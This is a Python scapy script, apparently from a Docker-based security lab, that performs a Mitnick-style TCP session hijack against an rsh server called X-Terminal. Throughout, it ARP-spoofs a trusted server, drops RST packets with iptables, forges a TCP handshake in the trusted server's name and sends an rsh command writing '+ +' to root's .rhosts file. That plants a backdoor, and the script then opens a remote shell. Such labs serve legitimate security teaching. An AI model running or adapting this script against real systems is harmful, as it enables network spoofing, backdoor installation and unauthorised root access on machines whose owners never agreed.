
import scapy.all as scapy 
from os import system
from time import sleep
from random import randint

# Static IPs from docker compose
X_TERM_IP = "10.9.0.5"
TRUSTED_SERVER_IP = "10.9.0.6"

# Find interface which X-Terminal is connected to
SUBNET = ".".join(X_TERM_IP.split(".")[:-1])
INTERFACE = [iface for iface in scapy.get_if_list() if scapy.get_if_addr(iface).startswith(SUBNET)][0]        

# Get attacker's IP and MAC address on X-Terminal's interface
ATTACKER_IP = scapy.get_if_addr(INTERFACE)
ATTACKER_MAC = scapy.get_if_hwaddr(INTERFACE)

# Ports
X_TERM_PORT = 514
TRUSTED_SERVER_PORT = 1023
RSH_CONN_PORT = 1024

# Command to open the backdoor
RSH_COMMAND = "echo '+ +' > ~/.rhosts"

# RSH packet structure: stderr port (opitional) | client username | server username | command
RSH_PACKET = f"{RSH_CONN_PORT}\0root\0root\0{RSH_COMMAND}\0"

completed = False

def arp_request(target_ip, sender_ip): 
    """
    Send an ARP request packet to the target machine from the sender machine IP.

    Parameters:
        target_ip (str): The IP address of the target machine.
        sender_ip (str): The IP address of the sender machine.
    """

    packet = scapy.ARP(op = 1, pdst = target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=sender_ip)
    scapy.send(packet, verbose = False)

def arp_reply(target_ip, sender_ip, sender_mac=None): 
    """
    Send an ARP reply packet to the target machine.

    Parameters:
        target_ip (str): The IP address of the target machine.
        sender_ip (str): The IP address of the sender machine.
        sender_mac (str, optional): The MAC address of the sender machine. Defaults to None, in which case the MAC address is resolved using the sender IP.
    """

    sender_mac = scapy.getmacbyip(sender_ip) if sender_mac is None else sender_mac
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=sender_ip, hwsrc=sender_mac)
    scapy.send(packet, verbose = False)

if __name__ == "__main__":
    try:
        print("Starting MITM attack...")
        print("     Using interface:", INTERFACE)
        print("     Attacker IP:", ATTACKER_IP)
        print("     X-Terminal IP:", X_TERM_IP)
        print("     Trusted Server IP:", TRUSTED_SERVER_IP)

        # ---------- Disable IP forwarding so attacker doesn't re-send the packets to the trusted-server 
        # - and drop RST packets so the attacker's kernel doesn't close the connection ----------
        print("Setting up environment...")

        system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")

        # ---------- ARP spoof to silence the trusted-server and redirect packets to the attacker ----------
        print("Spoofing trusted server...")

        # Run ARP request once for the X-Terminal and the trusted server to update their ARP tables
        arp_request(X_TERM_IP, TRUSTED_SERVER_IP)
        arp_request(TRUSTED_SERVER_IP, X_TERM_IP)

        # Tell X-Terminal and the trusted server that we are the other machine
        arp_reply(X_TERM_IP, TRUSTED_SERVER_IP, ATTACKER_MAC)
        arp_reply(TRUSTED_SERVER_IP, X_TERM_IP, ATTACKER_MAC)


        # ---------- Start a TCP connection with X-Terminal as the trusted server ----------
        print("Starting three-way handshake...")

        # Create SYN packet to X-Terminal to start the connection with random sequence number
        seq = randint(0, 4294967295)
        syn = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERM_IP)/scapy.TCP(flags="S", seq=seq, sport=TRUSTED_SERVER_PORT, dport=X_TERM_PORT)
        
        # Send SYN and receive SYN-ACK packet
        syn_ack = scapy.sr1(syn, verbose=False)

        # Send ACK packet to X-Terminal with the correct sequence and ack numbers
        print("Sending ACK packet...")
        ack = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERM_IP)/scapy.TCP(flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1, sport=TRUSTED_SERVER_PORT, dport=X_TERM_PORT)
        scapy.send(ack, verbose=False)


        # ---------- Send RSH packet to X-Terminal to execute a command ----------

        # Send RSH packet to X-Terminal as the trusted server with command
        print("Sending RSH packet...")
        rsh = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERM_IP)/scapy.TCP(flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1, sport=TRUSTED_SERVER_PORT, dport=X_TERM_PORT)/RSH_PACKET
        scapy.send(rsh, verbose=False)
        
        # X-Terminal will send a new TCP connection request to the trusted server
        print("Waiting for new TCP connection request...")
        syn_filter = f"tcp and dst host {TRUSTED_SERVER_IP} and dst port {RSH_CONN_PORT}"
        cap_packets = scapy.sniff(iface=INTERFACE, filter=syn_filter, count=2, timeout=5)
        syn = [packet for packet in cap_packets if packet[scapy.TCP].flags=='S'][0]

        # Send SYN-ACK packet to X-Terminal with the new sequence and ack numbers
        print("Sending SYN-ACK packet...")
        syn_ack = scapy.IP(src=TRUSTED_SERVER_IP, dst=X_TERM_IP)/scapy.TCP(flags="SA", seq=syn.ack, ack=syn.seq + 1, sport=RSH_CONN_PORT, dport=syn.sport)
        scapy.send(syn_ack, verbose=False)

        print("\nAttack done.\n")
        completed = True

    except KeyboardInterrupt:
        print("Interrupted. Exiting...")

    finally:
        # ---------- Restore ARP tables ----------
        print("Restoring ARP tables...")
        arp_reply(X_TERM_IP, TRUSTED_SERVER_IP)
        arp_reply(TRUSTED_SERVER_IP, X_TERM_IP)
        # ---------- Enable IP forwarding and remove RST packet drop ----------
        print("Restoring environment...")
        system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")

        if completed:
            # ---------- Open shell at X-Terminal ----------
            print("Opening shell at X-Terminal...")
            system(f"rsh {X_TERM_IP}")